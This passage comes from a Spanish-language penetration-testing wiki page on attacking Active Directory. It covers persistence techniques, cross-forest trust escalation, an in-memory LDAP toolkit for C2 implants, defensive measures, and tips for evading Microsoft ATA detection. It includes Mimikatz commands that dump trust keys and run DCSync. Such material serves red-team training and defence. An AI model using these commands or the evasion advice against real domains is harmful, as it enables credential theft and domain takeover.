Son como golden tickets forjados de una manera que **evita los mecanismos comunes de detección de golden tickets.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**Tener certificados de una cuenta o poder solicitarlos** es una muy buena forma de persistir en la cuenta del usuario (incluso si cambia la contraseña):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Usar certificados también permite persistir con altos privilegios dentro del dominio:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

El objeto **AdminSDHolder** en Active Directory asegura la seguridad de los **grupos privilegiados** (como Domain Admins y Enterprise Admins) aplicando una lista estándar de **Access Control List (ACL)** a estos grupos para evitar cambios no autorizados. Sin embargo, esta característica puede ser explotada; si un atacante modifica el ACL de AdminSDHolder para dar acceso total a un usuario normal, ese usuario obtiene control extenso sobre todos los grupos privilegiados. Esta medida de seguridad, pensada para proteger, puede volverse en contra si no se monitoriza de cerca.

[**Más información sobre AdminDSHolder Group aquí.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

Dentro de cada **Domain Controller (DC)** existe una cuenta de **administrador local**. Al obtener privilegios admin en tal máquina, se puede extraer el hash del Administrator local usando **mimikatz**. Después de esto, es necesaria una modificación en el registro para **habilitar el uso de esta contraseña**, permitiendo el acceso remoto a la cuenta Administrator local.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Podrías **dar** algunos **permisos especiales** a un **usuario** sobre ciertos objetos del dominio que le permitan **escalar privilegios en el futuro**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

Los **security descriptors** se usan para **almacenar** los **permisos** que un **objeto** tiene **sobre** un **objeto**. Si puedes simplemente **hacer** un **pequeño cambio** en el **security descriptor** de un objeto, puedes obtener privilegios muy interesantes sobre ese objeto sin necesidad de ser miembro de un grupo privilegiado.


{{#ref}}
security-descriptors.md
{{#endref}}

### Skeleton Key

Altera **LSASS** en memoria para establecer una **contraseña universal**, otorgando acceso a todas las cuentas del dominio.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Learn what is a SSP (Security Support Provider) here.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Puedes crear tu **propio SSP** para **capturar** en **clear text** las **credenciales** usadas para acceder a la máquina.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Registra un **nuevo Domain Controller** en el AD y lo usa para **push atributos** (SIDHistory, SPNs...) en objetos especificados **sin** dejar ningún **log** respecto a las **modificaciones**. Necesitas DA privileges y estar dentro del **root domain**.\
Ten en cuenta que si usas datos erróneos, aparecerán logs bastante feos.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Anteriormente discutimos cómo escalar privilegios si tienes **suficientes permisos para leer las contraseñas LAPS**. Sin embargo, estas contraseñas también pueden usarse para **mantener persistencia**.\
Ver:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft considera el **Forest** como el límite de seguridad. Esto implica que **comprometer un único dominio podría potencialmente llevar a que todo el Forest sea comprometido**.

### Basic Information

Un [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) es un mecanismo de seguridad que permite a un usuario de un **dominio** acceder a recursos en otro **dominio**. Esencialmente crea un enlace entre los sistemas de autenticación de ambos dominios, permitiendo que las verificaciones de autenticación fluyan sin problemas. Cuando los dominios configuran una trust, intercambian y retienen claves específicas dentro de sus **Domain Controllers (DCs)**, que son cruciales para la integridad de la trust.

En un escenario típico, si un usuario pretende acceder a un servicio en un **dominio confiado**, primero debe solicitar un ticket especial conocido como **inter-realm TGT** al DC de su propio dominio. Este TGT se cifra con una **key** compartida que ambos dominios han acordado. El usuario luego presenta este TGT al **DC del dominio confiado** para obtener un ticket de servicio (**TGS**). Tras la validación exitosa del inter-realm TGT por parte del DC del dominio confiado, éste emite un TGS, otorgando al usuario acceso al servicio.

**Pasos**:

1. Un **cliente** en **Domain 1** inicia el proceso usando su **NTLM hash** para solicitar un **Ticket Granting Ticket (TGT)** a su **Domain Controller (DC1)**.
2. DC1 emite un nuevo TGT si el cliente se autentica con éxito.
3. El cliente entonces solicita un **inter-realm TGT** a DC1, que es necesario para acceder a recursos en **Domain 2**.
4. El inter-realm TGT se cifra con una **trust key** compartida entre DC1 y DC2 como parte de la trust bidireccional.
5. El cliente lleva el inter-realm TGT al **Domain Controller (DC2)** de **Domain 2**.
6. DC2 verifica el inter-realm TGT usando su trust key compartida y, si es válido, emite un **Ticket Granting Service (TGS)** para el servidor en Domain 2 al que el cliente desea acceder.
7. Finalmente, el cliente presenta este TGS al servidor, que está cifrado con el hash de la cuenta del servidor, para obtener acceso al servicio en Domain 2.

### Different trusts

Es importante notar que **una trust puede ser 1 way o 2 ways**. En la opción de 2 ways, ambos dominios confiarán entre sí, pero en la relación de trust **1 way** uno de los dominios será el **trusted** y el otro el **trusting** domain. En este último caso, **solo podrás acceder a recursos dentro del trusting domain desde el trusted**.

Si Domain A confía en Domain B, A es el trusting domain y B es el trusted. Además, en **Domain A**, esto sería un **Outbound trust**; y en **Domain B**, sería un **Inbound trust**.

**Diferentes relaciones de trusting**

- **Parent-Child Trusts**: Es una configuración común dentro del mismo forest, donde un child domain tiene automáticamente una trust transitive bidireccional con su parent domain. Esencialmente, esto significa que las solicitudes de autenticación pueden fluir sin problemas entre el parent y el child.
- **Cross-link Trusts**: Denominadas "shortcut trusts", se establecen entre child domains para acelerar los procesos de referral. En forests complejos, los referrals de autenticación normalmente tienen que viajar hasta el forest root y luego bajar hasta el dominio objetivo. Creando cross-links, el trayecto se acorta, lo cual es especialmente beneficioso en entornos geográficamente dispersos.
- **External Trusts**: Se configuran entre dominios diferentes y no relacionados y son no-transitive por naturaleza. Según la [documentación de Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), las external trusts son útiles para acceder a recursos en un dominio fuera del forest actual que no está conectado por una forest trust. La seguridad se refuerza mediante SID filtering con external trusts.
- **Tree-root Trusts**: Estas trusts se establecen automáticamente entre el forest root domain y un tree root recién añadido. Aunque no son comunes, las tree-root trusts son importantes para añadir nuevos domain trees a un forest, permitiéndoles mantener un nombre de dominio único y asegurando la transitividad bidireccional. Más información en la [guía de Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Este tipo de trust es una trust bidireccional transitive entre dos forest root domains, aplicando también SID filtering para mejorar las medidas de seguridad.
- **MIT Trusts**: Estas trusts se establecen con dominios Kerberos no-Windows, compatibles con [RFC4120](https://tools.ietf.org/html/rfc4120). Las MIT trusts son más especializadas y atienden a entornos que requieren integración con sistemas basados en Kerberos fuera del ecosistema Windows.

#### Otras diferencias en las **trusting relationships**

- Una relación de trust también puede ser **transitive** (A trust B, B trust C, entonces A trust C) o **non-transitive**.
- Una relación de trust puede configurarse como **bidirectional trust** (ambos confían entre sí) o como **one-way trust** (solo uno confía en el otro).

### Attack Path

1. **Enumerar** las relaciones de trusting
2. Comprobar si algún **security principal** (usuario/grupo/computer) tiene **acceso** a recursos del **otro dominio**, quizá por entradas ACE o por pertenecer a grupos del otro dominio. Buscar **relaciones entre dominios** (la trust se creó probablemente para esto).
1. kerberoast en este caso podría ser otra opción.
3. **Comprometer** las **cuentas** que pueden **pivotar** entre dominios.

Los atacantes podrían acceder a recursos en otro dominio mediante tres mecanismos principales:

- **Local Group Membership**: Principales pueden ser añadidos a grupos locales en máquinas, como el grupo “Administrators” en un servidor, otorgándoles control significativo sobre esa máquina.
- **Foreign Domain Group Membership**: Principales también pueden ser miembros de grupos dentro del dominio extranjero. Sin embargo, la efectividad de este método depende de la naturaleza de la trust y del scope del grupo.
- **Access Control Lists (ACLs)**: Principales pueden ser especificados en una **ACL**, particularmente como entidades en **ACEs** dentro de una **DACL**, proveyéndoles acceso a recursos específicos. Para quienes quieran profundizar en la mecánica de ACLs, DACLs y ACEs, el whitepaper titulado “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” es un recurso invaluable.

### Find external users/groups with permissions

Puedes comprobar **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** para encontrar foreign security principals en el dominio. Estos serán usuarios/grupos de **un dominio/forest externo**.

Puedes comprobar esto en **Bloodhound** o usando powerview:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest privilege escalation
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Otras formas de enumerar las relaciones de confianza de dominio:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Hay **2 trusted keys**, una para _Child --> Parent_ y otra para _Parent_ --> _Child_.\
> Puedes comprobar cuál usa el dominio actual con:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Escalar a Enterprise admin en el dominio hijo/padre abusando de la confianza con SID-History injection:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Entender cómo se puede explotar el Configuration Naming Context (NC) es crucial. El Configuration NC sirve como un repositorio central de datos de configuración a través de un forest en entornos de Active Directory (AD). Estos datos se replican a cada Domain Controller (DC) dentro del forest, y los writable DCs mantienen una copia escribible del Configuration NC. Para explotarlo, se deben tener privilegios **SYSTEM en un DC**, preferiblemente un child DC.

**Link GPO to root DC site**

El contenedor Sites del Configuration NC incluye información sobre los sitios de todos los equipos unidos al dominio dentro del AD forest. Con privilegios SYSTEM en cualquier DC, un atacante puede vincular GPOs a los root DC sites. Esta acción puede comprometer el root domain al manipular las políticas aplicadas a esos sitios.

Para información detallada, se puede consultar la investigación sobre [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research).

**Compromise any gMSA in the forest**

Un vector de ataque consiste en dirigirse a gMSAs privilegiadas dentro del dominio. La KDS Root key, esencial para calcular las contraseñas de las gMSAs, está almacenada en el Configuration NC. Con privilegios SYSTEM en cualquier DC, es posible acceder a la KDS Root key y calcular las contraseñas de cualquier gMSA en todo el forest.

Análisis detallado y guía paso a paso pueden encontrarse en:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Ataque complementario a MSA delegada (BadSuccessor – abuso de atributos de migración):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Investigación externa adicional: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

Este método requiere paciencia, esperar a la creación de nuevos objetos AD privilegiados. Con privilegios SYSTEM, un atacante puede modificar el AD Schema para otorgar a cualquier usuario control total sobre todas las clases. Esto podría derivar en acceso no autorizado y control sobre objetos AD recién creados.

Lectura adicional disponible en [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).

**From DA to EA with ADCS ESC5**

La vulnerabilidad ADCS ESC5 apunta al control sobre objetos de Public Key Infrastructure (PKI) para crear una plantilla de certificado que permite autenticarse como cualquier usuario dentro del forest. Dado que los objetos PKI residen en el Configuration NC, comprometer un writable child DC permite ejecutar ataques ESC5.

Más detalles pueden leerse en [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c). En escenarios sin ADCS, el atacante puede configurar los componentes necesarios, como se discute en [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
En este escenario **un dominio externo confía en tu dominio**, dándote **permisos indeterminados** sobre él. Necesitarás encontrar **qué principals de tu dominio tienen qué acceso sobre el dominio externo** y luego intentar explotarlo:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Dominio de bosque externo - Unidireccional (Salida)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
En este escenario **tu dominio** está **confiando** algunos **privilegios** a un principal de **un dominio diferente**.

Sin embargo, cuando un **dominio es confiado** por el dominio que confía, el dominio confiado **crea un usuario** con un **nombre predecible** que usa como **contraseña la contraseña confiada**. Esto significa que es posible **acceder con un usuario del dominio que confía para entrar en el dominio confiado** para enumerarlo y tratar de escalar más privilegios:

{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Otra forma de comprometer el dominio confiado es encontrar un [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) creado en la **dirección opuesta** de la confianza de dominio (lo cual no es muy común).

Otra forma de comprometer el dominio confiado es esperar en una máquina a la que un **usuario del dominio confiado puede acceder** para iniciar sesión vía **RDP**. Entonces, el atacante podría inyectar código en el proceso de la sesión **RDP** y **acceder al dominio de origen de la víctima** desde allí.\
Además, si la **víctima montó su disco duro**, desde el proceso de la **sesión RDP** el atacante podría colocar **backdoors** en la **carpeta de inicio del disco duro**. Esta técnica se llama **RDPInception.**

{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Mitigación del abuso de trust de dominio

### **SID Filtering:**

- El riesgo de ataques que aprovechan el atributo SIDHistory a través de confianzas entre bosques se mitiga mediante SID Filtering, que está activado por defecto en todas las confianzas entre bosques. Esto se basa en la suposición de que las confianzas dentro del bosque son seguras, considerando el bosque, en lugar del dominio, como el límite de seguridad según la postura de Microsoft.
- Sin embargo, hay un inconveniente: SID Filtering puede interrumpir aplicaciones y el acceso de usuarios, lo que conduce a su desactivación ocasional.

### **Selective Authentication:**

- Para las confianzas entre bosques, emplear Selective Authentication garantiza que los usuarios de los dos bosques no sean autenticados automáticamente. En su lugar, se requieren permisos explícitos para que los usuarios accedan a los dominios y servidores dentro del dominio o bosque que confía.
- Es importante notar que estas medidas no protegen contra la explotación del Configuration Naming Context (NC) escribible ni contra ataques a la cuenta de confianza.

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## Abuso de AD basado en LDAP desde implantes en el host

La [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) re-implementa primitivas LDAP al estilo bloodyAD como x64 Beacon Object Files que se ejecutan enteramente dentro de un implant on-host (p. ej., Adaptix C2). Los operadores compilan el paquete con `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, cargan `ldap.axs`, y luego llaman `ldap <subcommand>` desde el beacon. Todo el tráfico viaja bajo el contexto de seguridad del inicio de sesión actual sobre LDAP (389) con signing/sealing o LDAPS (636) con auto certificate trust, por lo que no se requieren proxies socks ni artefactos en disco.

### Enumeración LDAP en el implant

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, y `get-groupmembers` resuelven nombres cortos/rutas OU en DNs completos y vuelcan los objetos correspondientes.
- `get-object`, `get-attribute`, y `get-domaininfo` extraen atributos arbitrarios (incluyendo descriptores de seguridad) además de los metadatos de forest/dominio desde `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation`, y `get-rbcd` exponen candidatos para roasting, configuraciones de delegación y descriptores existentes de [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) directamente desde LDAP.
- `get-acl` y `get-writable --detailed` analizan la DACL para listar fiduciarios, permisos (GenericAll/WriteDACL/WriteOwner/attribute writes) y herencia, proporcionando objetivos inmediatos para la escalada de privilegios mediante ACL.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP write primitives for escalation & persistence

- Los BOFs de creación de objetos (`add-user`, `add-computer`, `add-group`, `add-ou`) permiten al operador preparar nuevos principals o cuentas de máquina donde existan derechos sobre la OU. `add-groupmember`, `set-password`, `add-attribute` y `set-attribute` secuestran directamente objetivos una vez que se detectan derechos write-property.
- Comandos centrados en ACL como `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite` y `add-dcsync` traducen WriteDACL/WriteOwner en cualquier objeto AD en resets de contraseña, control de membresías de grupo o privilegios de DCSync sin dejar artefactos de PowerShell/ADSI. Los contrapartes `remove-*` limpian los ACEs inyectados.

### Delegation, roasting, and Kerberos abuse

- `add-spn`/`set-spn` hacen instantáneamente que un usuario comprometido sea Kerberoastable; `add-asreproastable` (UAC toggle) lo marca para AS-REP roasting sin tocar la contraseña.
- Las macros de delegación (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) reescriben `msDS-AllowedToDelegateTo`, flags de UAC o `msDS-AllowedToActOnBehalfOfOtherIdentity` desde el beacon, habilitando rutas de ataque constrained/unconstrained/RBCD y eliminando la necesidad de PowerShell remoto o RSAT.

### sidHistory injection, OU relocation, and attack surface shaping

- `add-sidhistory` inyecta SIDs privilegiados en el SID history de un principal controlado (ver [SID-History Injection](sid-history-injection.md)), proporcionando herencia de acceso sigilosa completamente sobre LDAP/LDAPS.
- `move-object` cambia el DN/OU de equipos o usuarios, permitiendo a un atacante arrastrar activos a OUs donde ya existen derechos delegados antes de abusar de `set-password`, `add-groupmember` o `add-spn`.
- Comandos de eliminación con alcance estricto (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, etc.) permiten una reversión rápida después de que el operador coseche credenciales o persistencia, minimizando la telemetría.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Some General Defenses

[**Learn more about how to protect credentials here.**](../stealing-credentials/credentials-protections.md)

### **Defensive Measures for Credential Protection**

- **Domain Admins Restrictions**: Se recomienda que los Domain Admins solo puedan iniciar sesión en Domain Controllers, evitando su uso en otros hosts.
- **Service Account Privileges**: Los servicios no deberían ejecutarse con privilegios de Domain Admin (DA) para mantener la seguridad.
- **Temporal Privilege Limitation**: Para tareas que requieran privilegios DA, se debe limitar su duración. Esto se puede lograr con: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay mitigation**: Auditar los Event IDs 2889/3074/3075 y luego aplicar LDAP signing más LDAPS channel binding en DCs/clients para bloquear intentos de MITM/relay de LDAP.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### **Implementing Deception Techniques**

- Implementar deception implica colocar trampas, como usuarios o equipos señuelo, con características como contraseñas que no expiran o marcados como Trusted for Delegation. Un enfoque detallado incluye crear usuarios con derechos específicos o agregarlos a grupos de alto privilegio.
- Un ejemplo práctico incluye herramientas como: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Más sobre despliegue de técnicas de deception en [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Identifying Deception**

- **For User Objects**: Indicadores sospechosos incluyen ObjectSID atípico, inicios de sesión poco frecuentes, fechas de creación y bajos conteos de bad password.
- **General Indicators**: Comparar atributos de posibles objetos señuelo con los de objetos genuinos puede revelar inconsistencias. Herramientas como [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) pueden ayudar a identificar estas deceptions.

### **Bypassing Detection Systems**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: Evitar la enumeración de sesiones en Domain Controllers para prevenir la detección por ATA.
- **Ticket Impersonation**: Utilizar claves **aes** para la creación de tickets ayuda a evadir la detección al no degradar a NTLM.
- **DCSync Attacks**: Se recomienda ejecutar desde un equipo que no sea Domain Controller para evitar la detección por ATA, ya que ejecutarlo directamente desde un Domain Controller disparará alertas.

## References

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [Hashcat](https://github.com/hashcat/hashcat)

{{#include ../../banners/hacktricks-training.md}}
